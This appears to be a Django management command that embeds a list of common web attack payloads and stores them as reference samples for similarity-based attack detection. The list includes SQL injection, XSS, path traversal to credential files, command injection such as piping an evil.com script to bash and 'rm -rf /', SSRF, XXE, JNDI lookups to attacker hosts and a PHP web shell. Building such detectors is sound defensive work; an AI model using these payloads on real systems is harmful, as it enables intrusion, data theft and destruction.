from django.core.management.base import BaseCommand
from tools.storage import save_suspicious_payload
from sentence_transformers import SentenceTransformer
import numpy as np

class Command(BaseCommand):
    def handle(self, *args, **kwargs):
        MODEL = SentenceTransformer("all-MiniLM-L6-v2")

        payloads = [

# =====================
#   SQL INJECTION
# =====================
"' OR '1'='1",
"' OR 'x'='x",
"1' OR '1'='1",
"admin' OR 1=1--",
"' OR 'a'='a",
"' OR ''='",
"\" OR \"\" = \"\"",
"' OR 1=1#",
"' OR 1=1 -- ",
"' OR 1=1/*",
"1 OR 1=1",
"' OR SLEEP(5)--",
"1' AND SLEEP(2) AND '1'='1",
"' UNION SELECT NULL,NULL--",
"' UNION SELECT username,password FROM users--",
"' UNION SELECT table_name,null FROM information_schema.tables--",
"' UNION SELECT load_file('/etc/passwd'),null--",
"' UNION SELECT CHAR(65,66,67),NULL--",
"' AND 1=(SELECT COUNT(*) FROM users)--",
"' HAVING 1=1--",
"' GROUP BY username HAVING 1=1--",
"') OR 1=1/*",
"') OR ('a'='a",
"' OR '1'='1' {",
"admin'--",
"admin' #",
"admin'/*",
"1'; DROP TABLE users; --",
"' DROP TABLE users --",
"'; EXEC xp_cmdshell('dir')--",
"' OR EXISTS(SELECT * FROM users)--",
"' OR ASCII(SUBSTRING((SELECT @@version),1,1))>52--",
"%27%20OR%201%3D1--",
"%27%20OR%20%27a%27%3D%27a",

# Encoded SQLi
"%2527%2520OR%25201%253D1--",
"%c0%27 OR 1=1--",
"%bf%27 OR 1=1--",

# Blind SQLi
"1' AND (SELECT 1 FROM pg_sleep(5))--",
"1 AND BENCHMARK(10000000,MD5(1))--",
"' OR IF(1=1,SLEEP(3),0)--",

# =====================
#   XSS
# =====================
"<script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"<svg onload=alert(1)>",
"<iframe src=javascript:alert(1)>",
"<body onload=alert('XSS')>",
"javascript:alert(1)",
"'><script>alert(document.cookie)</script>",
"\"/><script>alert(1)</script>",
"<embed src=javascript:alert(1)>",
"<object data=javascript:alert(1)>",
"<details open ontoggle=alert(1)>",
"<link rel=stylesheet href=javascript:alert(1)>",
"<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
"<scr<script>ipt>alert(1)</scr<script>ipt>",
"<img src=x onerror=prompt(1)>",
"<img src=x onerror=confirm(1)>",
"<svg><script>alert(1)</script></svg>",
"<video><source onerror=\"alert(1)\"></video>",
"<a href=javascript:alert(1)>click</a>",
"javascript:/*--><script>alert(1)</script>",
"`;alert(1);//",
"</script><script>alert(1)</script>",
"<script src=//evil.com/xss.js></script>",
"<script>eval(atob('YWxlcnQoMSk='))</script>",

# Encoded
"%3Cscript%3Ealert(1)%3C/script%3E",
"&#60;script&#62;alert(1)&#60;/script&#62;",
"%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",

# =====================
#   PATH TRAVERSAL
# =====================
"../../../../etc/passwd",
"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
"/var/www/html/../../../../etc/passwd",
"..%2f..%2f..%2fetc%2fpasswd",
"..%c0%af..%c0%afetc/passwd",
"..%5c..%5c..%5cwindows\\system.ini",
"/../../../../../../boot.ini",
"/../../../../../../root/.ssh/id_rsa",
"....//....//....//etc/shadow",
"..\\..\\..\\config\\database.yml",

# =====================
#   COMMAND INJECTION
# =====================
"; ls -la",
"| cat /etc/passwd",
"&& whoami",
"|| id",
"`id`",
"$(whoami)",
"`uname -a`",
"`shutdown -h now`",
"; rm -rf / #",
"; ping -c 4 8.8.8.8",
"; curl http://evil.com/a.sh | bash",
"& net user",
"| powershell -c whoami",
"sleep 5 #",
"'; ls; '",
"a & echo hacked",
"$(( $(echo 1) ))",

# Encoded
"%3B%20ls%20-la",
"%26%26%20whoami",

# =====================
#   SSRF
# =====================
"http://127.0.0.1/admin",
"http://localhost:8080",
"http://0.0.0.0:80",
"http://[::1]/",
"http://10.0.0.1/",
"http://192.168.1.1/admin",
"http://169.254.169.254/latest/meta-data/",
"http://127.0.0.1:2375/v1.24/containers/json",
"file:///etc/passwd",
"dict://127.0.0.1:25/",
"smb://127.0.0.1/",
"gopher://127.0.0.1:11211/_stats",
"http://127.0.0.1:8000/internal",
"http://unix:/var/run/docker.sock:/info",

# =====================
#   LDAP INJECTION
# =====================
"*)(|(objectclass=*))",
"*))(uid=*))(|(uid=*",
"(cn=*)",
"*)(uid=*))(|(sn=*)",
"admin*)(|(password=*))",
"*)(!(|(cn=*)))",

# =====================
#   XML + XXE
# =====================
"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
"<?xml version='1.0'?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><r>&xxe;</r>",
"<!DOCTYPE foo [ <!ENTITY % x SYSTEM 'http://evil.com/evil.dtd'> %x; ]>",
"<!ENTITY % xx SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">",

# =====================
#   MISC ATTACKS
# =====================
"../../../../boot.ini",
"{${jndi:ldap://attacker.com/a}}",
"${jndi:rmia://evil.com/bad}",
"{{ config.items() }}",
"${7*7}",
"{{7*7}}",
"${@print(md5(1))}",
"{{ dump(app) }}",
"{{ request.application.__dict__ }}",
"{% print 'hacked' %}",
"AA' OR '1'='1'--",
"A\" OR \"1\"=\"1\"--",
"<%= system('ls') %>",
"<% =File.open('/etc/passwd').read %>",
"<?php system($_GET['cmd']); ?>",

]


        for p in payloads:
            emb = MODEL.encode([p]).astype(np.float32)
            save_suspicious_payload(p, emb)

        self.stdout.write(self.style.SUCCESS("Saved test payloads!"))
